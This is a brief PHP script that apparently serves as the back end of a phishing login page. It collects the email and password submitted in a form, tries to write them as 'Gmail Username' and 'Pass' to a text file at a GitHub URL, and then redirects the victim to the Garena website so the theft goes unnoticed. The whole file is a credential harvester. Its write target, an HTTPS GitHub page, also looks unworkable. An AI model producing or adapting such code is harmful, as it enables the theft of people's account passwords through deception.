<?php

file_put_contents("https://github.com/Dx-fantome-bot4/Gardena.v3.2/blob/main/public/usernames.txt", "Gmail Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.garena.sg');
exit();
?>
